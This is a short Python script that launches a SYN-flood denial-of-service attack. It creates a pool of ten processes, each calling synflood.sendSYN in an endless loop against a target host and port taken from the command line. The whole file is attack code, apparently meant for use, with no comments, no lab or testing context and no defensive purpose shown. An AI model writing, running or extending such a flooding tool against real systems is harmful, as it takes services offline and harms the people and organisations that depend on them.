#! /usr/bin/python3
# -*- coding: UTF-8 -*-
import sys
from multiprocessing import Pool
import synflood


def attack(dest:str, port:int):
    print(dest,port)
    while True:
        synflood.sendSYN(dest, port)

def createProcess(dest:str, port:int):
    p = Pool(10)
    for _ in range(10):
        p.apply_async(attack, args=(dest,port))
    p.close()
    p.join()

if __name__ == "__main__":
    createProcess(sys.argv[1], int(sys.argv[2]))
